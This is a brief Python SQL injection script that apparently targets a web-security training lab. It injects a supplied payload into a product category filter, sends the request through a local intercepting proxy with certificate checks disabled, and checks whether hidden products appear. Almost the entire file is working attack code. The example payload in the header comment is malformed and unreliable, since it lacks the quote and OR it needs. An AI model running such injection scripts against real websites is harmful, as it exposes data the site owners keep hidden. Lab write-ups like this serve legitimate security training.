# SQL Query : SELECT * FROM products WHERE category = 'Gifts' AND released = 1
# Payload: SELECT * FROM products WHERE category = 'Gifts' 1=1-- AND released = 1


import requests
import sys 
import urllib3

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit_SQLi(url, payload):
	uri = '/filter?category='
	r = requests.get(url + uri + payload, verify=False, proxies=proxies)
	if "Cat Grin" in r.text:
		return True 
	else:
		return False

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		print("[-] Usage: %s <url> <payload>" % sys.argv[0])
		sys.exit(-1)

	if exploit_SQLi(url, payload):
		print("[-] SQL Injection successful")
	else:
		print("[-] SQL Injection unsuccessful")